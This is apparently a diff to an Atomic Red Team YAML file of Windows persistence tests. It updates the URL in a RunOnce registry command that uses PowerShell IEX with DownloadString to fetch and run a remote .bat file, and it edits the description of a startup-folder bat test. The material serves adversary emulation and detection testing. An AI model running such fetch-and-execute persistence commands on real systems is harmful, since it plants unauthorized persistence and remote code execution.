@@ -59,7 +59,7 @@ atomic_tests:
   executor:
     command: |
       $RunOnceKey = "#{reg_key_path}"
-      set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`")"'
+      set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`")"'
     cleanup_command: |
       Remove-ItemProperty -Path #{reg_key_path} -Name "NextRun" -Force -ErrorAction Ignore
     name: powershell
@@ -106,7 +106,8 @@ atomic_tests:
 - name: Suspicious bat file run from startup Folder
   auto_generated_guid: 5b6768e4-44d2-44f0-89da-a01d1430fd5e
   description: |
-    bat files can be placed in and executed from the startup folder to maintain persistance.
+    bat files can be placed in and executed from the startup folder to maintain persistance
+    
     Upon execution, cmd will be run and immediately closed. Additionally, the new files can be viewed in the "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
     folder and will also run when the computer is restarted and the user logs in.
   supported_platforms:
